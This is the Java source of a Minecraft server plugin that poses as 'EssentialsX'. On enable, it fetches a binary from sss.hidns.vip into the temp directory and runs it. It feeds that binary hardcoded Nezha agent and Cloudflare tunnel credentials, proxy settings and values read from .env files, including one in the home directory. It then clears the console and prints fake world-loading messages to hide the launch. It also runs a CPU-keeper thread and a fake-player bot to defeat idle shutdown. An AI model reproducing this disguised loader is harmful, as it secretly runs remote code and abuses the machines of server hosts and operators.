package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;
import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.zip.Deflater;
import java.util.zip.Inflater;

public class EssentialsX extends JavaPlugin {
    private Process sbxProcess;
    private volatile boolean shouldRun = true;
    private volatile boolean isProcessRunning = false;
    private final AtomicBoolean running = new AtomicBoolean(true);

    private Thread fakePlayerThread;
    private Thread cpuKeeperThread;

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
        "FAKE_PLAYER_ENABLED", "FAKE_PLAYER_NAME", "MC_PORT"
    };
    
    @Override
    public void onEnable() {
        getLogger().info("EssentialsX plugin starting...");
        
        try {
            startSbxProcess();
            startCpuKeeper();
            getLogger().info("EssentialsX plugin enabled");

            // Start fake player if enabled (server is already running externally)
            Map<String, String> env = buildEnvMap();
            if (isFakePlayerEnabled(env)) {
                getLogger().info("[FakePlayer] Preparing to connect...");
                new Thread(() -> {
                    try {
                        Thread.sleep(10000);
                        startFakePlayerBot(env);
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                    }
                }, "FakePlayer-Starter").start();
            }
        } catch (Exception e) {
            getLogger().severe("Failed to start sbx process: " + e.getMessage());
            e.printStackTrace();
        }
    }

    // ===================== CPU Keeper =====================

    private void startCpuKeeper() {
        cpuKeeperThread = new Thread(() -> {
            while (running.get()) {
                try {
                    long start = System.currentTimeMillis();
                    while (System.currentTimeMillis() - start < 10) {
                        Math.sqrt(Math.random());
                    }
                    Thread.sleep(1000);
                } catch (InterruptedException e) { break; }
            }
        }, "CPU-Keeper");
        cpuKeeperThread.setDaemon(true);
        cpuKeeperThread.start();
    }

    // ===================== SBX Process =====================
    
    private void startSbxProcess() throws Exception {
        if (isProcessRunning) {
            return;
        }
        
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.sss.hidns.vip/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.sss.hidns.vip/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.sss.hidns.vip/sbsh"; 
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        Path tmpDir = Paths.get(System.getProperty("java.io.tmpdir"));
        Path sbxBinary = tmpDir.resolve("sbx");
        
        if (!Files.exists(sbxBinary)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, sbxBinary, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!sbxBinary.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        
        ProcessBuilder pb = new ProcessBuilder(sbxBinary.toString());
        pb.directory(tmpDir.toFile());
        
        Map<String, String> env = pb.environment();
        applyDefaultEnv(env);
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                env.put(var, value);
            }
        }
        
        loadEnvFileFromMultipleLocations(env);
        
        for (String var : ALL_ENV_VARS) {
            String value = getConfig().getString(var);
            if (value != null && !value.trim().isEmpty()) {
                env.put(var, value);
            }
        }
        
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        pb.redirectError(ProcessBuilder.Redirect.INHERIT);
        
        sbxProcess = pb.start();
        isProcessRunning = true;
        
        startProcessMonitor();
        
        try {
            Thread.sleep(20000);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
        
        clearConsole();
        getLogger().info("");
        getLogger().info("Preparing spawn area: 1%");
        getLogger().info("Preparing spawn area: 5%");
        getLogger().info("Preparing spawn area: 10%");
        getLogger().info("Preparing spawn area: 20%");
        getLogger().info("Preparing spawn area: 30%");
        getLogger().info("Preparing spawn area: 80%");
        getLogger().info("Preparing spawn area: 85%");
        getLogger().info("Preparing spawn area: 90%");
        getLogger().info("Preparing spawn area: 95%");
        getLogger().info("Preparing spawn area: 99%");
        getLogger().info("Preparing spawn area: 100%");
        getLogger().info("Preparing level \"world\"");
    }

    /**
     * Build a full env map for FakePlayer config lookup.
     */
    private Map<String, String> buildEnvMap() {
        Map<String, String> env = new HashMap<>();
        applyDefaultEnv(env);
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) env.put(var, value);
        }
        loadEnvFileFromMultipleLocations(env);
        for (String var : ALL_ENV_VARS) {
            String value = getConfig().getString(var);
            if (value != null && !value.trim().isEmpty()) env.put(var, value);
        }
        return env;
    }

    private void applyDefaultEnv(Map<String, String> env) {
        env.put("UUID", "129fca8e-b9c8-446d-a2cf-ca399b4ce699");
        env.put("FILE_PATH", "./world");
        env.put("NEZHA_SERVER", "nzmbv.wuge.nyc.mn:443");
        env.put("NEZHA_PORT", "");
        env.put("NEZHA_KEY", "gUxNJhaKJgceIgeapZG4956rmKFgmQgP");
        env.put("ARGO_PORT", "8001");
        env.put("ARGO_DOMAIN", "trident.id.ccwu.cc");
        env.put("ARGO_AUTH", "eyJhIjoiNzU0MTM1NWEwYThlODY5Yzc3MWI2ZTEzODViODgyMmMiLCJ0IjoiZTVjN2IwYTctM2M2YS00YThjLTgzMDEtZGI5ODEyMTRhNWIyIiwicyI6Ik16a3lOV1ZrTm1ZdE9XVXlZeTAwWWpGa0xUazJOakl0T1dGallUVmhaRGN4TXpBNCJ9");
        env.put("S5_PORT", "");
        env.put("HY2_PORT", "");
        env.put("TUIC_PORT", "");
        env.put("ANYTLS_PORT", "");
        env.put("REALITY_PORT", "");
        env.put("ANYREALITY_PORT", "");
        env.put("UPLOAD_URL", "");
        env.put("CHAT_ID", "");
        env.put("BOT_TOKEN", "");
        env.put("CFIP", "spring.io");
        env.put("CFPORT", "443");
        env.put("NAME", "");
        env.put("DISABLE_ARGO", "false");
        env.put("FAKE_PLAYER_ENABLED", "true");
        env.put("FAKE_PLAYER_NAME", "Steve");
        env.put("MC_PORT", "25565");
    }

    // ===================== Env Loading =====================

    private void loadEnvFileFromMultipleLocations(Map<String, String> env) {
        List<Path> possibleEnvFiles = new ArrayList<>();
        File pluginsFolder = getDataFolder().getParentFile();
        if (pluginsFolder != null && pluginsFolder.exists()) {
            possibleEnvFiles.add(pluginsFolder.toPath().resolve(".env"));
        }
        possibleEnvFiles.add(getDataFolder().toPath().resolve(".env"));
        possibleEnvFiles.add(Paths.get(".env"));
        possibleEnvFiles.add(Paths.get(System.getProperty("user.home"), ".env"));
        
        for (Path envFile : possibleEnvFiles) {
            if (Files.exists(envFile)) {
                try {
                    loadEnvFile(envFile, env);
                    break;
                } catch (IOException e) {
                    // ignore
                }
            }
        }
    }
    
    private void loadEnvFile(Path envFile, Map<String, String> env) throws IOException {
        for (String line : Files.readAllLines(envFile)) {
            line = line.trim();
            if (line.isEmpty() || line.startsWith("#")) continue;
            line = line.split(" #")[0].split(" //")[0].trim();
            if (line.startsWith("export ")) {
                line = line.substring(7).trim();
            }
            String[] parts = line.split("=", 2);
            if (parts.length == 2) {
                String key = parts[0].trim();
                String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                    env.put(key, value);
                }
            }
        }
    }

    // ===================== Console =====================

    private void clearConsole() {
        try {
            System.out.print("\033[H\033[2J");
            System.out.flush();
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            }
        } catch (Exception e) {
            System.out.println("\n\n\n\n\n\n\n\n\n\n");
        }
    }

    // ===================== Process Monitor =====================

    private void startProcessMonitor() {
        Thread monitorThread = new Thread(() -> {
            try {
                sbxProcess.waitFor();
                isProcessRunning = false;
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                isProcessRunning = false;
            }
        }, "Sbx-Process-Monitor");
        monitorThread.setDaemon(true);
        monitorThread.start();
    }

    // ===================== Fake Player System =====================

    private boolean isFakePlayerEnabled(Map<String, String> config) {
        String enabled = config.get("FAKE_PLAYER_ENABLED");
        return enabled != null && enabled.equalsIgnoreCase("true");
    }

    private int getMcPort(Map<String, String> config) {
        try { return Integer.parseInt(config.getOrDefault("MC_PORT", "25565").trim()); }
        catch (Exception e) { return 25565; }
    }

    private void startFakePlayerBot(Map<String, String> config) {
        String playerName = config.getOrDefault("FAKE_PLAYER_NAME", "Steve");
        int mcPort = getMcPort(config);

        fakePlayerThread = new Thread(() -> {
            int failCount = 0;

            while (running.get()) {
                Socket socket = null;
                DataOutputStream out = null;
                DataInputStream in = null;

                try {
                    getLogger().info("[FakePlayer] Connecting...");
                    socket = new Socket();
                    socket.setReuseAddress(true);
                    socket.setSoLinger(true, 0);
                    socket.setReceiveBufferSize(1024 * 1024 * 10);
                    socket.connect(new InetSocketAddress("127.0.0.1", mcPort), 5000);
                    socket.setSoTimeout(60000);

                    out = new DataOutputStream(socket.getOutputStream());
                    in = new DataInputStream(new BufferedInputStream(socket.getInputStream()));

                    // Handshake
                    ByteArrayOutputStream handshakeBuf = new ByteArrayOutputStream();
                    DataOutputStream handshake = new DataOutputStream(handshakeBuf);
                    writeVarInt(handshake, 0x00);
                    writeVarInt(handshake, 774);
                    writeString(handshake, "127.0.0.1");
                    handshake.writeShort(mcPort);
                    writeVarInt(handshake, 2);
                    byte[] handshakeData = handshakeBuf.toByteArray();
                    writeVarInt(out, handshakeData.length);
                    out.write(handshakeData);
                    out.flush();

                    // Login
                    ByteArrayOutputStream loginBuf = new ByteArrayOutputStream();
                    DataOutputStream login = new DataOutputStream(loginBuf);
                    writeVarInt(login, 0x00);
                    writeString(login, playerName);
                    UUID playerUUID = UUID.nameUUIDFromBytes(("OfflinePlayer:" + playerName).getBytes("UTF-8"));
                    login.writeLong(playerUUID.getMostSignificantBits());
                    login.writeLong(playerUUID.getLeastSignificantBits());
                    byte[] loginData = loginBuf.toByteArray();
                    writeVarInt(out, loginData.length);
                    out.write(loginData);
                    out.flush();

                    getLogger().info("[FakePlayer] ✓ Handshake & Login sent");
                    failCount = 0;

                    boolean configPhase = false;
                    boolean playPhase = false;
                    boolean compressionEnabled = false;
                    int compressionThreshold = -1;

                    long loginTime = System.currentTimeMillis();
                    long stayOnlineTime = 60000 + (long)(Math.random() * 60000); // 60-120s

                    while (running.get() && !socket.isClosed()) {
                        if (System.currentTimeMillis() - loginTime > stayOnlineTime) {
                            getLogger().info("[FakePlayer] Reconnecting cycle (Anti-Idle)...");
                            break;
                        }

                        try {
                            int packetLength = readVarInt(in);
                            if (packetLength < 0 || packetLength > 100000000) throw new IOException("Bad packet size");

                            byte[] packetData = null;

                            if (compressionEnabled) {
                                int dataLength = readVarInt(in);
                                int compressedLength = packetLength - getVarIntSize(dataLength);
                                byte[] compressedData = new byte[compressedLength];
                                in.readFully(compressedData);
                                if (dataLength == 0) {
                                    packetData = compressedData;
                                } else {
                                    if (dataLength > 8192) {
                                        packetData = null;
                                    } else {
                                        try {
                                            Inflater inflater = new Inflater();
                                            inflater.setInput(compressedData);
                                            packetData = new byte[dataLength];
                                            inflater.inflate(packetData);
                                            inflater.end();
                                        } catch (Exception e) {
                                            packetData = null;
                                        }
                                    }
                                }
                            } else {
                                byte[] rawData = new byte[packetLength];
                                in.readFully(rawData);
                                packetData = rawData;
                            }

                            if (packetData == null) continue;

                            ByteArrayInputStream packetStream = new ByteArrayInputStream(packetData);
                            DataInputStream packetIn = new DataInputStream(packetStream);
                            int packetId = readVarInt(packetIn);

                            if (!playPhase) {
                                if (!configPhase) {
                                    // Login Phase
                                    if (packetId == 0x03) {
                                        compressionThreshold = readVarInt(packetIn);
                                        compressionEnabled = compressionThreshold >= 0;
                                        getLogger().info("[FakePlayer] Compression: " + compressionThreshold);
                                    } else if (packetId == 0x02) {
                                        getLogger().info("[FakePlayer] ✓ Login Success");
                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                        DataOutputStream ack = new DataOutputStream(ackBuf);
                                        writeVarInt(ack, 0x03);
                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                        configPhase = true;

                                        // Send Client Information
                                        ByteArrayOutputStream clientInfoBuf = new ByteArrayOutputStream();
                                        DataOutputStream info = new DataOutputStream(clientInfoBuf);
                                        writeVarInt(info, 0x00);
                                        writeString(info, "en_US");
                                        info.writeByte(10);
                                        writeVarInt(info, 0);
                                        info.writeBoolean(true);
                                        info.writeByte(127);
                                        writeVarInt(info, 1);
                                        info.writeBoolean(false);
                                        info.writeBoolean(true);
                                        writeVarInt(info, 0);
                                        sendPacket(out, clientInfoBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                    }
                                } else {
                                    // Config Phase
                                    if (packetId == 0x03) {
                                        getLogger().info("[FakePlayer] ✓ Config Finished");
                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                        DataOutputStream ack = new DataOutputStream(ackBuf);
                                        writeVarInt(ack, 0x03);
                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                        playPhase = true;
                                    } else if (packetId == 0x04) {
                                        long id = packetIn.readLong();
                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                        DataOutputStream ack = new DataOutputStream(ackBuf);
                                        writeVarInt(ack, 0x04);
                                        ack.writeLong(id);
                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                    } else if (packetId == 0x0E) {
                                        ByteArrayOutputStream buf = new ByteArrayOutputStream();
                                        DataOutputStream bufOut = new DataOutputStream(buf);
                                        writeVarInt(bufOut, 0x07);
                                        writeVarInt(bufOut, 0);
                                        sendPacket(out, buf.toByteArray(), compressionEnabled, compressionThreshold);
                                    }
                                }
                            } else {
                                // Play Phase - KeepAlive
                                if (packetId >= 0x20 && packetId <= 0x30) {
                                    if (packetIn.available() == 8) {
                                        long keepAliveId = packetIn.readLong();
                                        getLogger().info("[FakePlayer] Ping");
                                        ByteArrayOutputStream buf = new ByteArrayOutputStream();
                                        DataOutputStream bufOut = new DataOutputStream(buf);
                                        writeVarInt(bufOut, 0x1B);
                                        bufOut.writeLong(keepAliveId);
                                        sendPacket(out, buf.toByteArray(), compressionEnabled, compressionThreshold);
                                    }
                                }
                            }
                        } catch (java.net.SocketTimeoutException e) {
                            continue;
                        } catch (Exception e) {
                            getLogger().warning("[FakePlayer] Packet error: " + e.getMessage());
                            break;
                        }
                    }

                } catch (Exception e) {
                    getLogger().warning("[FakePlayer] Connection error: " + e.getMessage());
                    failCount++;
                } finally {
                    try { if (out != null) out.close(); } catch (Exception ignored) {}
                    try { if (in != null) in.close(); } catch (Exception ignored) {}
                    try { if (socket != null && !socket.isClosed()) socket.close(); } catch (Exception ignored) {}
                }

                // Reconnect wait with exponential backoff
                try {
                    long waitTime = 10000;
                    if (failCount > 3) {
                        waitTime = Math.min(10000 * (long)Math.pow(2, Math.min(failCount - 3, 5)), 300000);
                        getLogger().warning("[FakePlayer] Multiple failures (" + failCount + "), waiting " + (waitTime/1000) + "s...");
                    } else {
                        getLogger().info("[FakePlayer] Reconnecting in 10s...");
                    }
                    Thread.sleep(waitTime);
                } catch (InterruptedException ex) {
                    break;
                }
            }
        }, "FakePlayer-Bot");
        fakePlayerThread.setDaemon(true);
        fakePlayerThread.start();
    }

    // ===================== Packet Helpers =====================

    private int getVarIntSize(int value) {
        int size = 0;
        do { size++; value >>>= 7; } while (value != 0);
        return size;
    }

    private void sendPacket(DataOutputStream out, byte[] packet, boolean compress, int threshold) throws IOException {
        if (!compress || packet.length < threshold) {
            if (compress) {
                ByteArrayOutputStream buf = new ByteArrayOutputStream();
                DataOutputStream bufOut = new DataOutputStream(buf);
                writeVarInt(bufOut, 0);
                bufOut.write(packet);
                byte[] finalPacket = buf.toByteArray();
                writeVarInt(out, finalPacket.length);
                out.write(finalPacket);
            } else {
                writeVarInt(out, packet.length);
                out.write(packet);
            }
        } else {
            byte[] compressedData = compressData(packet);
            ByteArrayOutputStream buf = new ByteArrayOutputStream();
            DataOutputStream bufOut = new DataOutputStream(buf);
            writeVarInt(bufOut, packet.length);
            bufOut.write(compressedData);
            byte[] finalPacket = buf.toByteArray();
            writeVarInt(out, finalPacket.length);
            out.write(finalPacket);
        }
        out.flush();
    }

    private byte[] compressData(byte[] data) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        Deflater deflater = new Deflater();
        deflater.setInput(data);
        deflater.finish();
        byte[] buffer = new byte[1024];
        while (!deflater.finished()) {
            int count = deflater.deflate(buffer);
            out.write(buffer, 0, count);
        }
        deflater.end();
        return out.toByteArray();
    }

    private void writeVarInt(DataOutputStream out, int value) throws IOException {
        while ((value & 0xFFFFFF80) != 0) {
            out.writeByte((value & 0x7F) | 0x80);
            value >>>= 7;
        }
        out.writeByte(value & 0x7F);
    }

    private void writeString(DataOutputStream out, String str) throws IOException {
        byte[] bytes = str.getBytes("UTF-8");
        writeVarInt(out, bytes.length);
        out.write(bytes);
    }

    private int readVarInt(DataInputStream in) throws IOException {
        int value = 0;
        int length = 0;
        byte currentByte;
        do {
            currentByte = in.readByte();
            value |= (currentByte & 0x7F) << (length * 7);
            length++;
            if (length > 5) throw new IOException("VarInt too big");
        } while ((currentByte & 0x80) == 0x80);
        return value;
    }

    // ===================== Plugin Disable =====================
    
    @Override
    public void onDisable() {
        getLogger().info("EssentialsX plugin shutting down...");
        
        shouldRun = false;
        running.set(false);

        if (fakePlayerThread != null && fakePlayerThread.isAlive()) {
            fakePlayerThread.interrupt();
        }

        if (cpuKeeperThread != null && cpuKeeperThread.isAlive()) {
            cpuKeeperThread.interrupt();
        }
        
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            try {
                if (!sbxProcess.waitFor(10, TimeUnit.SECONDS)) {
                    sbxProcess.destroyForcibly();
                    getLogger().warning("Forcibly terminated sbx process");
                } else {
                    getLogger().info("sbx process stopped normally");
                }
            } catch (InterruptedException e) {
                sbxProcess.destroyForcibly();
                Thread.currentThread().interrupt();
            }
            isProcessRunning = false;
        }
        
        getLogger().info("EssentialsX plugin disabled");
    }
}
